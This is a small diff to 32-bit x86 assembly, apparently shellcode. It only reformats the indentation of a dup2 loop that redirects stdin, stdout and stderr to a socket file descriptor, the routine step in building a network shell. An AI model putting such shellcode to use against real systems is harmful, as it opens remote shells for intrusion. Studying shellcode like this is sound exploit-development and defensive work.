@@ -48,9 +48,9 @@ BITS 32
 
 
   ; dup2, change stdin|stdout|stderr to socket file descriptor
- 	xchg ebx, eax   ; ebx -> peer socket fd | eax -> 5
-	push BYTE 0x3
-	pop ecx
+  xchg ebx, eax   ; ebx -> peer socket fd | eax -> 5
+  push BYTE 0x3
+  pop ecx
 dup2loop:
   mov BYTE al, 0x3f
   dec ecx
